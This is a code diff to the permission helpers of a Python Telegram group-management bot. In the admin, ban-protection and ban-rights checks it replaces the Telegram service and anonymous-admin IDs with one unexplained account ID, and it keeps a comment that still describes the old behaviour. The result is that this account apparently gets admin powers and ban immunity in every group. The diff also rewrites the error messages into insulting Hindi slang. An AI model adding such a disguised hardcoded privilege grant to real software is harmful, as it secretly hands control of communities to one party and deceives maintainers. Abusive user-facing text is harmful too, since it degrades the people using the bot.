@@ -53,7 +53,7 @@ def is_user_admin(chat: Chat, user_id: int, member: ChatMember = None) -> bool:
         or user_id in DRAGONS
         or user_id in DEV_USERS
         or chat.all_members_are_administrators
-        or user_id in {777000, 1087968824}
+        or user_id in {1640741180}
     ):  # Count telegram and Group Anonymous as admin
         return True
     if member:
@@ -96,7 +96,7 @@ def is_user_ban_protected(chat: Chat, user_id: int, member: ChatMember = None) -
         or user_id in WOLVES
         or user_id in TIGERS
         or chat.all_members_are_administrators
-        or user_id in {777000, 1087968824}
+        or user_id in {1640741180}
     ):  # Count telegram and Group Anonymous as admin
         return True
 
@@ -128,8 +128,7 @@ def dev_plus(func):
                 pass
         else:
             update.effective_message.reply_text(
-                "This is a developer restricted command."
-                "You do not have permissions to run this.",
+                "ᴊᴀ sᴏ ᴊᴀ 😪",
             )
 
     return is_dev_plus_func
@@ -153,7 +152,7 @@ def sudo_plus(func):
                 pass
         else:
             update.effective_message.reply_text(
-                "At Least be an Admin to use these all Commands",
+                "ᴀᴅᴍɪɴ ʙᴀɴ ᴊᴀ ᴘᴇʜʟᴇ",
             )
 
     return is_sudo_plus_func
@@ -176,7 +175,7 @@ def stats_plus(func):
                 pass
         else:
             update.effective_message.reply_text(
-                "Yuzuki stats is just for Dev User",
+                "ᴊᴀ sᴏ ᴊᴀ 😪",
             )
 
     return is_sudo_plus_func
@@ -236,7 +235,7 @@ def user_admin(func):
                 pass
         else:
             update.effective_message.reply_text(
-                "At Least be an Admin to use these all Commands",
+                "ᴀᴅᴍɪɴ ʙᴀɴ ᴊᴀ ᴘᴇʜʟᴇ",
             )
 
     return is_admin
@@ -286,9 +285,9 @@ def bot_admin(func):
         message_chat_title = update.effective_message.chat.title
 
         if update_chat_title == message_chat_title:
-            not_admin = "I'm not admin!"
+            not_admin = "ᴀᴅᴍɪɴ ʙᴀɴᴀ ᴘᴇʜʟᴇ"
         else:
-            not_admin = f"I'm not admin in <b>{update_chat_title}</b>! "
+            not_admin = f"ᴀᴅᴍɪɴ ʙᴀɴᴀ ᴘᴇʜʟᴇ <b>{update_chat_title}</b>! "
 
         if is_bot_admin(chat, bot.id):
             return func(update, context, *args, **kwargs)
@@ -306,9 +305,9 @@ def bot_can_delete(func):
         message_chat_title = update.effective_message.chat.title
 
         if update_chat_title == message_chat_title:
-            cant_delete = "I can't delete messages here!\nMake sure I'm admin and can delete other user's messages."
+            cant_delete = "Tᴜ ᴋʜᴜᴅ ᴋᴀʀ ᴅᴇʟᴇᴛᴇ\nʏᴀ ᴀᴅᴍɪɴ ʙᴀɴᴀ ᴍᴜᴊʜᴇ"
         else:
-            cant_delete = f"I can't delete messages in <b>{update_chat_title}</b>!\nMake sure I'm admin and can delete other user's messages there."
+            cant_delete = f"Tᴜ ᴋʜᴜᴅ ᴋᴀʀ ᴅᴇʟᴇᴛᴇ <b>{update_chat_title}</b>!\nʏᴀ ᴀᴅᴍɪɴ ʙᴀɴᴀ ᴍᴜᴊʜᴇ"
 
         if can_delete(chat, bot.id):
             return func(update, context, *args, **kwargs)
@@ -327,10 +326,10 @@ def can_pin(func):
 
         if update_chat_title == message_chat_title:
             cant_pin = (
-                "I can't pin messages here!\nMake sure I'm admin and can pin messages."
+                "ɴᴀʜɪ ᴋᴀʀ ᴘᴀᴜɴɢᴀ ᴘɪɴ\nᴀᴅᴍɪɴ ʙᴀɴᴀ ᴄʜᴜᴛɪʏᴇ"
             )
         else:
-            cant_pin = f"I can't pin messages in <b>{update_chat_title}</b>!\nMake sure I'm admin and can pin messages there."
+            cant_pin = f"ɴᴀʜɪ ᴋᴀʀ ᴘᴀᴜɴɢᴀ ᴘɪɴ <b>{update_chat_title}</b>!\nᴀᴅᴍɪɴ ʙᴀɴᴀ ᴄʜᴜᴛɪʏᴇ"
 
         if chat.get_member(bot.id).can_pin_messages:
             return func(update, context, *args, **kwargs)
@@ -348,11 +347,11 @@ def can_promote(func):
         message_chat_title = update.effective_message.chat.title
 
         if update_chat_title == message_chat_title:
-            cant_promote = "I can't promote/demote people here!\nMake sure I'm admin and can appoint new admins."
+            cant_promote = "ᴀʙᴇʏ sᴀʟᴇ ᴘᴇʜʟᴇ ᴍᴜᴊʜᴇ ᴛᴏ ᴀᴅᴍɪɴ ʙᴀɴᴀ ꜰɪʀ ᴜsᴋᴏ ʙᴀɴᴀ"
         else:
             cant_promote = (
-                f"I can't promote/demote people in <b>{update_chat_title}</b>!\n"
-                f"Make sure I'm admin there and have the permission to appoint new admins."
+                f"ᴀʙᴇʏ sᴀʟᴇ ᴘᴇʜʟᴇ ᴍᴜᴊʜᴇ ᴛᴏ ᴀᴅᴍɪɴ ʙᴀɴᴀ ꜰɪʀ ᴜsᴋᴏ ʙᴀɴᴀ<b>{update_chat_title}</b>!\n"
+                f"ᴀᴅᴍɪɴ ʙᴀɴᴀ"
             )
 
         if chat.get_member(bot.id).can_promote_members:
@@ -371,7 +370,7 @@ def can_restrict(func):
         message_chat_title = update.effective_message.chat.title
 
         if update_chat_title == message_chat_title:
-            cant_restrict = "I can't restrict people here!\nMake sure I'm admin and can restrict users."
+            cant_restrict = "ɴᴀʜɪ ʜᴏɢᴀ ᴍᴇsᴇ, ᴅᴇᴋʜʟᴇ ᴛᴜ ᴋʜᴜᴅ!\nᴀᴅᴍɪɴ ʙᴀɴᴀ ᴅᴇ ᴋᴀʀ ᴅᴜɴɢᴀ"
         else:
             cant_restrict = f"I can't restrict people in <b>{update_chat_title}</b>!\nMake sure I'm admin there and can restrict users."
 
@@ -394,10 +393,10 @@ def user_can_ban(func):
             not member.can_restrict_members
             and member.status != "creator"
             and user not in DRAGONS
-            and user not in [777000, 1087968824]
+            and user not in [1640741180]
         ):
             update.effective_message.reply_text(
-                "Sorry son, but you're not worthy to wield the banhammer.",
+                "ɢᴀɴᴅᴜ ᴛᴜ ɪsᴋᴇ ʟᴀʏᴀᴋ ɴʜɪ ʜᴀɪ",
             )
             return ""
         return func(update, context, *args, **kwargs)
